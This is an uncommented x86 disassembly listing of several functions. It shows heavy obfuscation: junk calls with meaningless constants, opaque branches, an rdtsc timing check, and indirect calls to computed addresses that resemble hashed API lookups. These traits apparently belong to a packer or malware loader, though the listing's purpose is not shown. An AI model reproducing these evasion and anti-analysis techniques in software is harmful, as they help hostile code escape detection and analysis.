  40617e:	push   0xffffffd7
  406180:	call   0x407fe2
  406185:	add    esp,0x10
  406188:	push   0xfffffffe
  40618a:	push   0x430cd800
  40618f:	push   0x43
  406191:	call   0x408197
  406196:	add    esp,0xc
  406199:	push   0x7c
  40619b:	call   0x407edf
  4061a0:	add    esp,0x4
  4061a3:	or     DWORD PTR [ebp-0x24],esi
  4061a6:	cmp    eax,0x58
  4061a9:	je     0x4061bf
  4061ab:	push   0xda29e00
  4061b0:	push   0xf72a2b00
  4061b5:	push   0xffffffea
  4061b7:	call   0x408624
  4061bc:	add    esp,0xc
  4061bf:	push   0xedf02d00
  4061c4:	push   0x13292b00
  4061c9:	push   0x33
  4061cb:	push   0x17
  4061cd:	push   0x77a40a00
  4061d2:	call   0x407edf
  4061d7:	add    esp,0x14
  4061da:	push   0x2
  4061dc:	push   0x53
  4061de:	push   0xffffffaf
  4061e0:	call   0x408515
  4061e5:	add    esp,0xc
  4061e8:	push   0xaff2f600
  4061ed:	call   0x407fe2
  4061f2:	add    esp,0x4
  4061f5:	push   0x8
  4061f7:	push   0x6d
  4061f9:	push   0x69
  4061fb:	call   0x4082a5
  406200:	add    esp,0xc
  406203:	xor    eax,eax
  406205:	push   0xe33fda00
  40620a:	push   0xafec1500
  40620f:	push   0x7c
  406211:	push   0x10
  406213:	call   0x408515
  406218:	add    esp,0x10
  40621b:	sub    edi,esi
  40621d:	sub    DWORD PTR [ebp-0x24],edi
  406220:	push   0x27
  406222:	push   0xffffff8e
  406224:	push   0x7
  406226:	push   0x5
  406228:	call   0x407fe2
  40622d:	add    esp,0x10
  406230:	push   0xffffff9f
  406232:	push   0x7daa2400
  406237:	push   0xffffffa5
  406239:	push   0x4d
  40623b:	push   0x22
  40623d:	call   0x407fe2
  406242:	add    esp,0x14
  406245:	push   0x4f5c9300
  40624a:	push   0x3c
  40624c:	push   0xffffffd0
  40624e:	call   0x407fe2
  406253:	add    esp,0xc
  406256:	push   0x7d8d7d00
  40625b:	push   0xffffffba
  40625d:	push   0xffffff81
  40625f:	push   0xfe87d00
  406264:	call   0x408783
  406269:	add    esp,0x10
  40626c:	lea    ebx,[ebp-0x4]
  40626f:	push   0xd977900
  406274:	push   0x5dfaee00
  406279:	push   0xffffffd6
  40627b:	push   0xffffff9b
  40627d:	call   0x4082a5
  406282:	add    esp,0x10
  406285:	push   0xb3132d00
  40628a:	push   0xafcaeb00
  40628f:	call   0x407fe2
  406294:	add    esp,0x8
  406297:	cmp    ebx,esi
  406299:	jne    0x40629e
  40629b:	sub    DWORD PTR [ebp-0x24],ebx
  40629e:	push   0xffffffbd
  4062a0:	push   0xd73e3000
  4062a5:	push   0xbf332000
  4062aa:	call   0x4082a5
  4062af:	add    esp,0xc
  4062b2:	push   ebx
  4062b3:	push   0x77f69300
  4062b8:	push   0x6b037e00
  4062bd:	push   0xbb27f500
  4062c2:	call   0x408624
  4062c7:	add    esp,0xc
  4062ca:	push   0x1d1baaa1
  4062cf:	or     esi,edi
  4062d1:	call   0x408949
  4062d6:	push   0xfffffff5
  4062d8:	push   0xffffff99
  4062da:	push   0x37ccb500
  4062df:	push   0x1dc13100
  4062e4:	call   0x407d25
  4062e9:	add    esp,0x10
  4062ec:	push   0x8f02d500
  4062f1:	push   0xffffff9f
  4062f3:	call   0x408515
  4062f8:	add    esp,0x8
  4062fb:	cmp    esi,0x7e
  4062fe:	jne    0x4063d0
  406304:	push   0xffffffea
  406306:	call   0x408949
  40630b:	add    esp,0x4
  40630e:	and    esi,ebx
  406310:	mov    edx,0x6b
  406315:	push   0xb7af1800
  40631a:	push   0xffffff98
  40631c:	call   0x407d25
  406321:	add    esp,0x8
  406324:	push   0x32
  406326:	push   0x66
  406328:	push   0xfdc8b100
  40632d:	push   0xffffffff
  40632f:	call   0x407d25
  406334:	add    esp,0x10
  406337:	push   0xffffffa6
  406339:	call   0x408197
  40633e:	add    esp,0x4
  406341:	push   0x4a
  406343:	push   0x17
  406345:	push   0x8dbc1400
  40634a:	push   0x2d947800
  40634f:	push   0x3dc92100
  406354:	call   0x408624
  406359:	add    esp,0x14
  40635c:	call   0x408949
  406361:	call   0x407edf
  406366:	cmp    esi,ebx
  406368:	je     0x4063d0
  40636a:	push   0xffffff95
  40636c:	call   0x4082a5
  406371:	add    esp,0x4
  406374:	mov    ebx,DWORD PTR [ebp-0x24]
  406377:	mov    DWORD PTR [ebp-0x24],esi
  40637a:	push   0x2def1b00
  40637f:	push   0x13
  406381:	push   0x2
  406383:	push   0x77c91900
  406388:	call   0x407edf
  40638d:	add    esp,0x10
  406390:	push   0xafc04900
  406395:	push   0x5b479200
  40639a:	call   0x407edf
  40639f:	add    esp,0x8
  4063a2:	mov    esi,DWORD PTR [ebp-0x24]
  4063a5:	call   0x407d25
  4063aa:	cmp    esi,edi
  4063ac:	je     0x4063d0
  4063ae:	cmp    ebx,DWORD PTR ds:0x4373c0
  4063b4:	jne    0x4063d0
  4063b6:	sub    ebx,esi
  4063b8:	mov    edx,ebx
  4063ba:	mov    esi,0x32
  4063bf:	sub    DWORD PTR [ebp-0x24],ebx
  4063c2:	sub    edx,eax
  4063c4:	cmp    edx,esi
  4063c6:	jne    0x4063d0
  4063c8:	call   0x408515
  4063cd:	add    DWORD PTR [ebp-0x24],esi
  4063d0:	call   0x407edf
  4063d5:	mov    edi,0xb8
  4063da:	mov    ebx,esi
  4063dc:	push   0xffffff99
  4063de:	push   0x26
  4063e0:	call   0x408783
  4063e5:	add    esp,0x8
  4063e8:	call   0x408949
  4063ed:	push   0x2f
  4063ef:	call   0x4082a5
  4063f4:	add    esp,0x4
  4063f7:	push   0x20
  4063f9:	push   0xffffffca
  4063fb:	push   0x8ffb7d00
  406400:	push   0x37e07100
  406405:	call   0x4082a5
  40640a:	add    esp,0x10
  40640d:	push   0x17
  40640f:	call   0x407edf
  406414:	add    esp,0x4
  406417:	and    ebx,edi
  406419:	push   0xfffffff4
  40641b:	push   0x78
  40641d:	call   0x408949
  406422:	add    esp,0x8
  406425:	sub    eax,ebx
  406427:	push   0xef22d000
  40642c:	push   0x2d981000
  406431:	push   0x7da7ec00
  406436:	push   0xb7ee9500
  40643b:	call   0x407d25
  406440:	add    esp,0x10
  406443:	push   0x2dc8c200
  406448:	push   0x47253600
  40644d:	push   0xffffffe2
  40644f:	push   0x8fabab00
  406454:	push   0xffffffb7
  406456:	call   0x408624
  40645b:	add    esp,0x14
  40645e:	call   0x406674
  406463:	push   0x50
  406465:	push   0xadbdc100
  40646a:	push   0xafd47f00
  40646f:	call   0x407ba2
  406474:	add    esp,0xc
  406477:	mov    edx,DWORD PTR [ebp-0x4]
  40647a:	cmp    edx,DWORD PTR ds:0x4373c0
  406480:	jne    0x406485
  406482:	sub    DWORD PTR [ebp-0x24],edx
  406485:	shr    edx,0x10
  406488:	mov    esi,DWORD PTR [ebp-0x24]
  40648b:	and    esi,edi
  40648d:	xor    ecx,ecx
  40648f:	add    ecx,edi
  406491:	sub    DWORD PTR [ebp-0x24],edx
  406494:	sub    DWORD PTR [ebp-0x24],esi
  406497:	sub    ecx,eax
  406499:	add    DWORD PTR [ebp-0x24],ecx
  40649c:	cmp    edx,0x7cc2
  4064a2:	jne    0x4065f0
  4064a8:	push   0x2de0dd00
  4064ad:	push   0xffffffd4
  4064af:	push   0x20
  4064b1:	call   0x408197
  4064b6:	add    esp,0xc
  4064b9:	call   0x407d25
  4064be:	mov    esi,0x7d0328a9
  4064c3:	push   0x2b
  4064c5:	call   0x4082a5
  4064ca:	add    esp,0x4
  4064cd:	sub    esi,DWORD PTR [ebp-0x4]
  4064d0:	push   0xfffffffd
  4064d2:	push   0xffffffb3
  4064d4:	push   0x49
  4064d6:	call   0x408515
  4064db:	add    esp,0xc
  4064de:	call   esi
  4064e0:	sub    DWORD PTR [ebp-0x24],esi
  4064e3:	mov    DWORD PTR [ebp-0x34],eax
  4064e6:	push   0x40
  4064e8:	push   0xffffff86
  4064ea:	push   0x43
  4064ec:	push   0x8f1bfa00
  4064f1:	push   0x37
  4064f3:	call   0x407ba2
  4064f8:	add    esp,0x14
  4064fb:	mov    edi,0x406f10
  406500:	sub    eax,edi
  406502:	mov    esi,0xa3
  406507:	push   0x9f30e800
  40650c:	push   0x7f49fa00
  406511:	push   0xffffff8d
  406513:	call   0x408949
  406518:	add    esp,0xc
  40651b:	push   0x7b6f5200
  406520:	push   0xffffff80
  406522:	call   0x408949
  406527:	add    esp,0x8
  40652a:	mov    edx,DWORD PTR ds:0x4373d4
  406530:	push   0xcb123d00
  406535:	push   0x7b348e00
  40653a:	push   0xede07800
  40653f:	push   0x7dcaeb00
  406544:	push   0x19
  406546:	call   0x408197
  40654b:	add    esp,0x14
  40654e:	add    DWORD PTR [ebp-0x24],esi
  406551:	push   0xafcb4400
  406556:	push   0xcb258c00
  40655b:	push   0xa
  40655d:	push   0xfffffff9
  40655f:	push   0xffffff93
  406561:	call   0x408949
  406566:	add    esp,0x14
  406569:	push   DWORD PTR [ebp-0x4]
  40656c:	push   0x7cc3fada
  406571:	push   DWORD PTR [ebp-0x34]
  406574:	call   edi
  406576:	add    DWORD PTR [ebp-0x24],eax
  406579:	call   0x407d25
  40657e:	add    DWORD PTR [ebp-0x34],0x28
  406585:	push   0xa3796400
  40658a:	push   0x77e3d900
  40658f:	push   0x13
  406591:	call   0x408624
  406596:	add    esp,0xc
  406599:	push   0xf15f700
  40659e:	call   0x407fe2
  4065a3:	add    esp,0x4
  4065a6:	mov    edi,DWORD PTR [ebp-0x34]
  4065a9:	push   0xbdd41f00
  4065ae:	push   0xffffffca
  4065b0:	push   0xb
  4065b2:	push   0x5dd75600
  4065b7:	call   0x408949
  4065bc:	add    esp,0x10
  4065bf:	call   edi
  4065c1:	cmp    edi,0x3e
  4065c4:	je     0x4065cf
  4065c6:	mov    esi,DWORD PTR [ebp-0x24]
  4065c9:	add    DWORD PTR [ebp-0x24],esi
  4065cc:	and    DWORD PTR [ebp-0x24],edi
  4065cf:	push   0xffffff91
  4065d1:	push   0xe720a600
  4065d6:	call   0x408624
  4065db:	add    esp,0x8
  4065de:	push   0x37d6f100
  4065e3:	push   0xafc8ba00
  4065e8:	call   0x4082a5
  4065ed:	add    esp,0x8
  4065f0:	push   0x18
  4065f2:	push   0xbf674c00
  4065f7:	call   0x408949
  4065fc:	add    esp,0x8
  4065ff:	push   0xbb429700
  406604:	push   0xbf5ad400
  406609:	call   0x407ba2
  40660e:	add    esp,0x8
  406611:	xor    DWORD PTR [ebp-0x24],eax
  406614:	push   0x9db51200
  406619:	push   0xffffff8f
  40661b:	call   0x408515
  406620:	add    esp,0x8
  406623:	mov    eax,0xca
  406628:	sub    DWORD PTR [ebp-0x24],edi
  40662b:	push   0xffffffe9
  40662d:	call   0x407d25
  406632:	add    esp,0x4
  406635:	push   0xffffff93
  406637:	push   0xcd9ce400
  40663c:	push   0xfeb9d00
  406641:	push   0x36
  406643:	push   0x4da5af00
  406648:	call   0x4082a5
  40664d:	add    esp,0x14
  406650:	pop    edi
  406651:	sub    DWORD PTR [ebp-0x24],edi
  406654:	pop    esi
  406655:	call   0x407ba2
  40665a:	pop    ebx
  40665b:	push   0x43173a00
  406660:	push   0x377dab00
  406665:	call   0x408624
  40666a:	add    esp,0x8
  40666d:	leave  
  40666e:	ret    
  40666f:	int3   
  406670:	int3   
  406671:	int3   
  406672:	int3   
  406673:	int3   
  406674:	push   ebp
  406675:	mov    ebp,esp
  406677:	sub    esp,0x44
  40667a:	push   0x4da4c000
  40667f:	push   0xdf626500
  406684:	push   0xffffff8f
  406686:	call   0x407fe2
  40668b:	add    esp,0xc
  40668e:	push   0xbb4ea500
  406693:	push   0xffffffe0
  406695:	push   0x2f3c1800
  40669a:	push   0xfffffff9
  40669c:	push   0xff15e00
  4066a1:	call   0x408515
  4066a6:	add    esp,0x14
  4066a9:	push   ebx
  4066aa:	cmp    eax,0x5e
  4066ad:	jne    0x4066cf
  4066af:	cmp    eax,DWORD PTR [ebp-0x38]
  4066b2:	jne    0x4066cf
  4066b4:	cmp    eax,0x2b
  4066b7:	je     0x4066cf
  4066b9:	push   0xf7af800
  4066be:	push   0x21
  4066c0:	push   0x48
  4066c2:	push   0x773eb700
  4066c7:	call   0x408949
  4066cc:	add    esp,0x10
  4066cf:	push   0xfffffff2
  4066d1:	push   0xbdbf5700
  4066d6:	push   0xb3089100
  4066db:	push   0x4e
  4066dd:	push   0xffffffa0
  4066df:	call   0x4082a5
  4066e4:	add    esp,0x14
  4066e7:	push   esi
  4066e8:	call   0x407d25
  4066ed:	push   edi
  4066ee:	mov    ecx,0xa9
  4066f3:	push   0x736c1600
  4066f8:	call   0x407d25
  4066fd:	add    esp,0x4
  406700:	push   0x8f344000
  406705:	push   0x6d94b200
  40670a:	call   0x407edf
  40670f:	add    esp,0x8
  406712:	push   0x7e
  406714:	push   0xddc24300
  406719:	push   0xffffff9d
  40671b:	push   0xddbbf200
  406720:	call   0x408515
  406725:	add    esp,0x10
  406728:	mov    DWORD PTR [ebp-0x30],0xf3d9584e
  40672f:	push   0xffffffe7
  406731:	push   0xffffff9d
  406733:	call   0x407ba2
  406738:	add    esp,0x8
  40673b:	call   0x406bb2
  406740:	mov    ecx,0x2c
  406745:	mov    DWORD PTR [ebp-0x34],eax
  406748:	mov    DWORD PTR [ebp-0x34],ecx
  40674b:	mov    DWORD PTR [ebp-0x4],eax
  40674e:	sub    eax,ecx
  406750:	push   0xffffff85
  406752:	call   0x407edf
  406757:	add    esp,0x4
  40675a:	push   0x57378800
  40675f:	push   0xeb294b00
  406764:	push   0xf453d00
  406769:	push   0x33402400
  40676e:	push   0xfbc4900
  406773:	call   0x408515
  406778:	add    esp,0x14
  40677b:	call   0x406bb2
  406780:	mov    esi,DWORD PTR [ebp-0x34]
  406783:	test   eax,0x162b
  406788:	je     0x4067bb
  40678a:	mov    edi,DWORD PTR ds:0x4373d0
  406790:	cmp    esi,DWORD PTR ds:0x4373e4
  406796:	jne    0x4067bb
  406798:	cmp    esi,DWORD PTR ds:0x4373e4
  40679e:	jne    0x4067bb
  4067a0:	cmp    esi,DWORD PTR [ebp-0x28]
  4067a3:	je     0x4067bb
  4067a5:	mov    ebx,esi
  4067a7:	mov    edx,0xa
  4067ac:	sub    ebx,eax
  4067ae:	add    DWORD PTR [ebp-0x34],ebx
  4067b1:	sub    edx,edi
  4067b3:	or     DWORD PTR [ebp-0x34],edi
  4067b6:	sub    edx,esi
  4067b8:	add    DWORD PTR [ebp-0x34],edx
  4067bb:	mov    DWORD PTR [ebp-0x40],eax
  4067be:	add    eax,eax
  4067c0:	or     eax,edi
  4067c2:	push   0xffffff90
  4067c4:	push   0x21
  4067c6:	push   0xafe6f400
  4067cb:	call   0x408197
  4067d0:	add    esp,0xc
  4067d3:	push   0xb73bdd00
  4067d8:	push   0x45
  4067da:	push   0x672f8000
  4067df:	push   0xffffffb2
  4067e1:	call   0x408197
  4067e6:	add    esp,0x10
  4067e9:	call   0x406bb2
  4067ee:	sub    edi,eax
  4067f0:	or     DWORD PTR [ebp-0x34],edi
  4067f3:	mov    DWORD PTR [ebp-0x14],eax
  4067f6:	push   0xffffffca
  4067f8:	call   0x4082a5
  4067fd:	add    esp,0x4
  406800:	mov    eax,DWORD PTR [ebp-0x40]
  406803:	cmp    esi,DWORD PTR ds:0x4373e4
  406809:	je     0x40687f
  40680b:	mov    ebx,DWORD PTR ds:0x4373d0
  406811:	test   eax,0x5337
  406816:	jne    0x40687f
  406818:	cmp    esi,0xffffffc5
  40681b:	jne    0x40687f
  40681d:	sub    ebx,eax
  40681f:	mov    edi,DWORD PTR ds:0x4373cc
  406825:	mov    ecx,DWORD PTR [ebp-0x34]
  406828:	cmp    ebx,ecx
  40682a:	je     0x40687f
  40682c:	sub    DWORD PTR [ebp-0x34],ebx
  40682f:	mov    ebx,0xcb
  406834:	mov    edx,DWORD PTR [ebp-0x34]
  406837:	cmp    ecx,DWORD PTR [ebp-0x24]
  40683a:	jne    0x40687f
  40683c:	sub    ecx,eax
  40683e:	mov    esi,DWORD PTR [ebp-0x34]
  406841:	cmp    esi,DWORD PTR [ebp-0x34]
  406844:	je     0x40687f
  406846:	sub    DWORD PTR [ebp-0x34],esi
  406849:	xor    esi,esi
  40684b:	add    DWORD PTR [ebp-0x34],ecx
  40684e:	sub    edx,eax
  406850:	sub    edi,eax
  406852:	add    DWORD PTR [ebp-0x34],esi
  406855:	add    edi,ecx
  406857:	or     DWORD PTR [ebp-0x34],edx
  40685a:	mov    DWORD PTR [ebp-0x34],edi
  40685d:	or     edx,edi
  40685f:	mov    DWORD PTR [ebp-0x34],esi
  406862:	add    edx,esi
  406864:	sub    ebx,eax
  406866:	add    DWORD PTR [ebp-0x34],edx
  406869:	cmp    ebx,0xffffffaf
  40686c:	je     0x40687f
  40686e:	mov    esi,DWORD PTR [ebp-0x34]
  406871:	mov    ecx,DWORD PTR [ebp-0x34]
  406874:	add    DWORD PTR [ebp-0x34],ebx
  406877:	sub    DWORD PTR [ebp-0x34],esi
  40687a:	sub    ecx,esi
  40687c:	add    DWORD PTR [ebp-0x34],ecx
  40687f:	sub    eax,DWORD PTR [ebp-0x4]
  406882:	mov    edx,edi
  406884:	mov    ebx,DWORD PTR [ebp-0x34]
  406887:	or     edx,ecx
  406889:	cmp    edi,ecx
  40688b:	jne    0x4068d4
  40688d:	xor    ecx,ecx
  40688f:	mov    edi,0x16d0
  406894:	cmp    edx,ecx
  406896:	je     0x4068d4
  406898:	mov    esi,DWORD PTR [ebp-0x34]
  40689b:	and    ebx,ecx
  40689d:	mov    ecx,0x3a
  4068a2:	sub    DWORD PTR [ebp-0x34],esi
  4068a5:	add    edx,eax
  4068a7:	add    DWORD PTR [ebp-0x34],esi
  4068aa:	cmp    ebx,0xa8
  4068b0:	je     0x4068d4
  4068b2:	mov    esi,DWORD PTR [ebp-0x34]
  4068b5:	sub    edx,ecx
  4068b7:	add    DWORD PTR [ebp-0x34],edi
  4068ba:	mov    edi,DWORD PTR [ebp-0x34]
  4068bd:	sub    DWORD PTR [ebp-0x34],ebx
  4068c0:	and    edx,eax
  4068c2:	add    DWORD PTR [ebp-0x34],ebx
  4068c5:	and    esi,edi
  4068c7:	add    DWORD PTR [ebp-0x34],ebx
  4068ca:	or     DWORD PTR [ebp-0x34],esi
  4068cd:	add    edx,edi
  4068cf:	sub    edx,edi
  4068d1:	sub    DWORD PTR [ebp-0x34],edx
  4068d4:	xor    eax,0xffec4ba7
  4068d9:	cmp    eax,0xffffff83
  4068dc:	je     0x4068e6
  4068de:	cmp    eax,DWORD PTR [ebp-0x2c]
  4068e1:	je     0x4068e6
  4068e3:	add    DWORD PTR [ebp-0x34],eax
  4068e6:	mov    esi,DWORD PTR [ebp-0x14]
  4068e9:	cmp    esi,0x75
  4068ec:	je     0x4068fb
  4068ee:	mov    ecx,0xd265
  4068f3:	add    DWORD PTR [ebp-0x34],ebx
  4068f6:	add    ecx,eax
  4068f8:	and    DWORD PTR [ebp-0x34],ecx
  4068fb:	sub    esi,DWORD PTR [ebp-0x40]
  4068fe:	sub    ecx,ebx
  406900:	cmp    esi,DWORD PTR ds:0x4373e4
  406906:	je     0x40690b
  406908:	sub    DWORD PTR [ebp-0x34],ecx
  40690b:	xor    esi,0xffec4ba2
  406911:	add    DWORD PTR [ebp-0x34],esi
  406914:	cmp    eax,esi
  406916:	je     0x406aa6
  40691c:	and    eax,edi
  40691e:	mov    ecx,DWORD PTR [ebp-0x34]
  406921:	mov    edx,DWORD PTR ds:0x4373d0
  406927:	push   0x3d9c5a00
  40692c:	push   0xb7569000
  406931:	call   0x407ba2
  406936:	add    esp,0x8
  406939:	push   0x4373e4
  40693e:	call   DWORD PTR ds:0x4370dc
  406944:	sub    esi,ebx
  406946:	test   eax,0xfa
  40694b:	jne    0x40695c
  40694d:	mov    ecx,DWORD PTR [ebp-0x34]
  406950:	mov    edi,0x86
  406955:	sub    edi,ecx
  406957:	sub    esi,edi
  406959:	sub    DWORD PTR [ebp-0x34],esi
  40695c:	or     eax,eax
  40695e:	je     0x406aa6
  406964:	mov    edx,0x6351
  406969:	mov    esi,DWORD PTR [ebp-0x34]
  40696c:	sub    esi,ecx
  40696e:	cmp    esi,ecx
  406970:	je     0x406980
  406972:	test   esi,0xd3
  406978:	je     0x406980
  40697a:	or     DWORD PTR [ebp-0x34],edx
  40697d:	sub    DWORD PTR [ebp-0x34],esi
  406980:	add    DWORD PTR [ebp-0x30],0x8d536a94
  406987:	mov    ecx,edi
  406989:	mov    esi,DWORD PTR [ebp-0x34]
  40698c:	add    DWORD PTR [ebp-0x34],edx
  40698f:	and    ecx,esi
  406991:	xor    DWORD PTR [ebp-0x34],ecx
  406994:	lea    edi,[eax+0x5d2]
  40699a:	push   0xffffffc4
  40699c:	push   0xd73f6e00
  4069a1:	push   0x30
  4069a3:	call   0x4082a5
  4069a8:	add    esp,0xc
  4069ab:	push   0xffffff94
  4069ad:	push   0x17
  4069af:	push   0x76
  4069b1:	push   0x6f2c3100
  4069b6:	call   0x407fe2
  4069bb:	add    esp,0x10
  4069be:	inc    edi
  4069bf:	call   0x407fe2
  4069c4:	mov    esi,DWORD PTR [edi]
  4069c6:	and    eax,esi
  4069c8:	mov    ecx,DWORD PTR ds:0x4373e4
  4069ce:	sub    ecx,ebx
  4069d0:	push   0x2d
  4069d2:	push   0xd7420800
  4069d7:	call   0x408624
  4069dc:	add    esp,0x8
  4069df:	push   0x2a
  4069e1:	push   0x6b
  4069e3:	push   0xfffffff2
  4069e5:	push   0xafe5b100
  4069ea:	push   0xffffffd8
  4069ec:	call   0x407edf
  4069f1:	add    esp,0x14
  4069f4:	sub    esi,0x773d451c
  4069fa:	add    DWORD PTR [ebp-0x34],esi
  4069fd:	push   0xff40d00
  406a02:	push   0x7f
  406a04:	call   0x407ba2
  406a09:	add    esp,0x8
  406a0c:	cmp    esi,0x13ea2ee5
  406a12:	jne    0x40699a
  406a14:	xor    ebx,ebx
  406a16:	mov    eax,DWORD PTR ds:0x4373e4
  406a1c:	push   0xffffff86
  406a1e:	call   0x407ba2
  406a23:	add    esp,0x4
  406a26:	cmp    eax,0x8722652d
  406a2b:	jne    0x406a85
  406a2d:	add    ebx,eax
  406a2f:	push   0x37d2aa00
  406a34:	push   0x3ddfea00
  406a39:	push   0x77
  406a3b:	call   0x408515
  406a40:	add    esp,0xc
  406a43:	and    ebx,esi
  406a45:	xor    eax,eax
  406a47:	or     eax,esi
  406a49:	xor    ecx,ecx
  406a4b:	push   0x4e
  406a4d:	push   0xffffffa9
  406a4f:	push   0x4c
  406a51:	push   0xe
  406a53:	call   0x408515
  406a58:	add    esp,0x10
  406a5b:	push   0xb35bb300
  406a60:	push   0xbd82cf00
  406a65:	push   0xffffffa3
  406a67:	push   0xffffff8c
  406a69:	push   0xffffffbb
  406a6b:	call   0x407ba2
  406a70:	add    esp,0x14
  406a73:	push   0xa7405700
  406a78:	push   0x6f
  406a7a:	call   0x408624
  406a7f:	add    esp,0x8
  406a82:	sub    DWORD PTR [ebp-0x34],ebx
  406a85:	push   0xffffffec
  406a87:	call   0x408783
  406a8c:	add    esp,0x4
  406a8f:	mov    esi,DWORD PTR [edi+0x4]
  406a92:	cmp    esi,DWORD PTR [ebp-0x24]
  406a95:	jne    0x406a9e
  406a97:	mov    ecx,ebx
  406a99:	call   0x408197
  406a9e:	call   0x4082a5
  406aa3:	sub    DWORD PTR [ebp-0x30],esi
  406aa6:	push   0x5710d700
  406aab:	push   0xffffff96
  406aad:	push   0xfffffff9
  406aaf:	push   0x13
  406ab1:	call   0x408515
  406ab6:	add    esp,0x10
  406ab9:	cmp    ebx,DWORD PTR ds:0x4373cc
  406abf:	je     0x406b10
  406ac1:	mov    edi,DWORD PTR [ebp-0x34]
  406ac4:	test   edi,0x49
  406aca:	je     0x406b10
  406acc:	push   0xc
  406ace:	push   0x21
  406ad0:	push   0x8dab1900
  406ad5:	push   0xd
  406ad7:	push   0xfc93900
  406adc:	call   0x407ba2
  406ae1:	add    esp,0x14
  406ae4:	push   0x2dcceb00
  406ae9:	push   0xf7b4e400
  406aee:	push   0x4b309b00
  406af3:	push   0xffffff97
  406af5:	call   0x408949
  406afa:	add    esp,0x10
  406afd:	test   edi,0x2d
  406b03:	jne    0x406b10
  406b05:	test   ebx,0xd77e
  406b0b:	jne    0x406b10
  406b0d:	add    DWORD PTR [ebp-0x34],edi
  406b10:	push   0xa326fd00
  406b15:	push   0xbda7be00
  406b1a:	push   0x3df02b00
  406b1f:	push   0xf32b4200
  406b24:	push   0xffffff96
  406b26:	call   0x408783
  406b2b:	add    esp,0x14
  406b2e:	mov    ebx,DWORD PTR [ebp+0xc]
  406b31:	push   0xb7168c00
  406b36:	push   0x66
  406b38:	push   0xaffa4600
  406b3d:	call   0x408624
  406b42:	add    esp,0xc
  406b45:	mov    ecx,DWORD PTR [ebp-0x30]
  406b48:	sub    edi,esi
  406b4a:	or     DWORD PTR [ebp-0x34],ebx
  406b4d:	sub    DWORD PTR [ebp-0x34],ecx
  406b50:	sub    edi,ecx
  406b52:	mov    esi,0x1b
  406b57:	cmp    ebx,esi
  406b59:	je     0x406b75
  406b5b:	xor    eax,eax
  406b5d:	mov    edx,DWORD PTR [ebp-0x34]
  406b60:	sub    esi,edi
  406b62:	cmp    edx,DWORD PTR [ebp-0x1c]
  406b65:	je     0x406b75
  406b67:	add    DWORD PTR [ebp-0x34],esi
  406b6a:	add    DWORD PTR [ebp-0x34],edx
  406b6d:	cmp    ecx,DWORD PTR [ebp-0x28]
  406b70:	je     0x406b75
  406b72:	mov    DWORD PTR [ebp-0x8],eax
  406b75:	mov    DWORD PTR [ebx+0x0],ecx
  406b78:	push   0xffffffa9
  406b7a:	push   0x5f
  406b7c:	push   0xffffffca
  406b7e:	push   0x4f
  406b80:	call   0x407fe2
  406b85:	add    esp,0x10
  406b88:	add    DWORD PTR [ebp-0x34],eax
  406b8b:	pop    edi
  406b8c:	push   0x79
  406b8e:	push   0x48
  406b90:	push   0xffffffa5
  406b92:	call   0x407ba2
  406b97:	add    esp,0xc
  406b9a:	pop    esi
  406b9b:	mov    eax,0x6a
  406ba0:	call   0x408949
  406ba5:	pop    ebx
  406ba6:	add    DWORD PTR [ebp-0x34],ebx
  406ba9:	leave  
  406baa:	ret    0x8
  406bad:	int3   
  406bae:	int3   
  406baf:	int3   
  406bb0:	int3   
  406bb1:	int3   
  406bb2:	push   ebp
  406bb3:	mov    ebp,esp
  406bb5:	sub    esp,0x2c
  406bb8:	xor    ecx,ecx
  406bba:	call   0x408515
  406bbf:	push   ebx
  406bc0:	mov    edx,0xe347
  406bc5:	push   0xffffffef
  406bc7:	push   0x2a
  406bc9:	call   0x407edf
  406bce:	add    esp,0x8
  406bd1:	push   0x55
  406bd3:	push   0xffffffcb
  406bd5:	push   0x2704f100
  406bda:	push   0xfffffff3
  406bdc:	push   0xffffff92
  406bde:	call   0x408783
  406be3:	add    esp,0x14
  406be6:	push   esi
  406be7:	mov    edx,0x8b203250
  406bec:	mov    DWORD PTR [ebp-0x28],edx
  406bef:	push   edi
  406bf0:	push   0xffffff9d
  406bf2:	push   0xab702300
  406bf7:	push   0x1ded3400
  406bfc:	push   0x15
  406bfe:	push   0xffffffc0
  406c00:	call   0x407edf
  406c05:	add    esp,0x14
  406c08:	push   0xffffff99
  406c0a:	call   0x408624
  406c0f:	add    esp,0x4
  406c12:	push   0x6e
  406c14:	push   0xddfcd800
  406c19:	call   0x4082a5
  406c1e:	add    esp,0x8
  406c21:	push   0xfdef2d00
  406c26:	push   0xffffffd8
  406c28:	push   0x9dee8600
  406c2d:	push   0xffffffee
  406c2f:	push   0xdd20300
  406c34:	call   0x408624
  406c39:	add    esp,0x14
  406c3c:	rdtsc  
  406c3e:	mov    ebx,edx
  406c40:	add    DWORD PTR [ebp-0x28],eax
  406c43:	mov    ecx,0x92
  406c48:	sub    ecx,edx
  406c4a:	add    ebx,ebx
  406c4c:	sub    ebx,edx
  406c4e:	sub    ecx,edx
  406c50:	sub    ebx,ecx
  406c52:	sub    DWORD PTR [ebp-0x28],edx
  406c55:	sub    DWORD PTR [ebp-0x28],ebx
  406c58:	mov    ecx,DWORD PTR [ebp-0x28]
  406c5b:	mov    edi,0x9a
  406c60:	cmp    ecx,edi
  406c62:	je     0x406c80
  406c64:	mov    esi,DWORD PTR [ebp-0x28]
  406c67:	sub    ecx,ebx
  406c69:	sub    DWORD PTR [ebp-0x28],edi
  406c6c:	mov    edi,0x2d
  406c71:	mov    DWORD PTR [ebp-0x28],ecx
  406c74:	sub    DWORD PTR [ebp-0x28],edi
  406c77:	add    esi,ebx
  406c79:	cmp    esi,ecx
  406c7b:	jne    0x406c80
  406c7d:	sub    DWORD PTR [ebp-0x28],esi
  406c80:	sub    ebx,edx
  406c82:	mov    esi,DWORD PTR [ebp-0x28]
  406c85:	mov    edx,DWORD PTR [ebp-0x28]
  406c88:	add    edx,eax
  406c8a:	cmp    edx,eax
  406c8c:	jne    0x406cd4
  406c8e:	or     ebx,edx
  406c90:	mov    edi,ebx
  406c92:	or     DWORD PTR [ebp-0x28],edi
  406c95:	cmp    esi,0x17300052
  406c9b:	jne    0x406cd4
  406c9d:	cmp    ebx,0x1b
  406ca0:	jne    0x406cd4
  406ca2:	xor    ecx,ecx
  406ca4:	mov    edi,0x8f316081
  406ca9:	add    DWORD PTR [ebp-0x28],edi
  406cac:	cmp    esi,0xffffff8d
  406caf:	je     0x406cd4
  406cb1:	add    ecx,ecx
  406cb3:	xor    DWORD PTR [ebp-0x28],ecx
  406cb6:	sub    esi,ebx
  406cb8:	mov    edi,DWORD PTR [ebp-0x28]
  406cbb:	xor    ecx,ecx
